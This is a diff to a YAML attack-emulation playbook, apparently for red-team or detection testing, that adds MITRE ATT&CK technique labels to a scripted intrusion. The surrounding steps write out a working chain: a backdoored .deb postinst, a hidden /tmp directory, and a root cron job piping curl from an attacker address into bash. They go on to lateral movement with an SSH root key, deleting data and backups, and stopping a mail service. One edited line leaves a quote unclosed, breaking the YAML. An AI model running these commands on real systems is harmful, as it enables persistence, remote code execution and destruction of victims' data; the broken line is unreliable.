@@ -36,6 +36,7 @@ commands:
     metadata:
       techniques: "T1040"
       tactics: "Credential Access"
+      technique_name: "Network Sniffing"
 
   - type: sleep
     seconds: 20
@@ -122,11 +123,6 @@ commands:
     background: True
     kill_on_exit: true
 
-#  - type: ssh
-#    cmd: "curl http://$ATTACKER_ADDRESS:8888/install.sh | bash"
-#    background: True
-#
-
   - type: ssh
     session: foothold
     cmd: "ls -l /var/www/html/debian\n"
@@ -134,15 +130,16 @@ commands:
     metadata:
       techniques: "T1083"
       tactics: "Discovery"
+      technique_name: "File and Directory Discovery"
 
   - type: ssh
     cmd: "apt update && apt install -y dpkg-dev\n"
     session: foothold
     interactive: True
     metadata:
-      techniques: "T1059"
+      techniques: "T1059.004"
       tactics: "Execution"
-      technique_name: "Command and Scripting Interpreter"
+      technique_name: "Command and Scripting Interpreter: Unix Shell"
 
   - type: sleep
     seconds: 20
@@ -152,9 +149,9 @@ commands:
     cmd: "mkdir /tmp/.tmux_data\n"
     interactive: True
     metadata:
-      techniques: "T1036.055"
+      techniques: "T1036.005,T1564.001 "
       tactics: "Defense Evasion"
-      technique_name: "Masquerading: Match Legitimate Name or Location "
+      technique_name: "Masquerading: Match Legitimate Name or Location,Hide Artifacts: Hidden Files and Directories "
 
   - type: ssh
     session: foothold
@@ -166,8 +163,9 @@ commands:
     cmd: "dpkg-deb -R /var/www/html/debian/healthcheckd_1.0-1_amd64.deb healthcheckd\n"
     interactive: True
     metadata:
-      techniques: "T1543"
-      tactics: "Persistence"
+      techniques: "T1574"
+      tactics: "Persistence,Defense Evasion"
+      technique_name: "Hijack Execution Flow"
 
   - type: ssh
     session: foothold
@@ -180,9 +178,9 @@ commands:
     interactive: True
     ## TODO
     metadata:
-      techniques: "T1059"
+      techniques: "T1059,T1574"
       tactics: "Execution"
-      technique_name: "Command and Scripting Interpreter"
+      technique_name: "Command and Scripting Interpreter,Hijack Execution Flow"
 
   - type: ssh
     session: foothold
@@ -199,8 +197,9 @@ commands:
     cmd: "vim DEBIAN/postinst\n"
     interactive: True
     metadata:
-      techniques: "T1547"
+      techniques: "T1059,T1574"
       tactics: "Persistence"
+      technique_name: "Command and Scripting Interpreter,Hijack Execution Flow"
 
   - type: ssh
     session: foothold
@@ -217,8 +216,9 @@ commands:
     cmd: "echo '*/5 * * * * root /usr/bin/curl http://$ATTACKER_ADDRESS:8888/install.sh | /bin/bash' > /etc/cron.d/health"
     interactive: True
     metadata:
-        techniques: "T1053,T1105"
+        techniques: "T1053.003,T1105,T1071.001 "
         tactics: "Persistence,Command and Control"
+        technique_name: "Scheduled Task/Job: Cron,Ingress Tool Transfer,Application Layer Protocol: Web Protocols "
 
   - type: ssh
     session: foothold
@@ -243,6 +243,7 @@ commands:
     metadata:
       techniques: "T1072"
       tactics: "Execution,Lateral Movement"
+      technique_name: "Software Deployment Tools"
 
   - type: ssh
     session: foothold
@@ -261,6 +262,8 @@ commands:
     metadata:
       techniques: "T1072"
       tactics: "Execution,Lateral Movement"
+      technique_name: "Software Deployment Tools"
+
 
   - type: ssh
     cmd: echo "ssh -i .ssh/rootkey -o StrictHostKeyChecking=no root@192.168.100.23 \"apt update && apt install -y healthcheckd\"" | at now + 2 minute
@@ -270,7 +273,6 @@ commands:
     jmp_hostname:  192.42.2.42
     clear_cache: True
     exit_on_error: False
-
 
 
 #################### MOVED ################################
@@ -314,8 +316,9 @@ commands:
     session: movement
     cmd: cat /etc/passwd
     metadata:
-      techniques: "T1087"
+      techniques: "T1087.001"
       tactics: "Discovery"
+      technique_name: "Account Discovery: Local Account"
   
   - type: msf-session
     session: movement
@@ -323,24 +326,28 @@ commands:
     metadata:
       techniques: "T1531"
       tactics: "Impact"
+      technique_name: "Account Access Removal"
   
   - type: msf-session
     session: movement
     cmd: rm -rf /media/data/*
     metadata:
-     techniques: "T1485"
-     tactics: "Impact"
+      techniques: "T1485"
+      tactics: "Impact
+      technique_name: "Data Destruction"
   
   - type: msf-session
     session: movement
     cmd: rm -rf /var/backups/*
     metadata:
-     techniques: "T1490"
-     tactics: "Impact"
+      techniques: "T1490"
+      tactics: "Impact"
+      technique_name: "Inhibit System Recovery"
 
   - type: msf-session
     session: movement
     cmd: systemctl stop exim4.service
     metadata:
-     techniques: "T1489"
-     tactics: "Impact"
+      techniques: "T1489"
+      tactics: "Impact"
+      technique_name: "Service Stop"
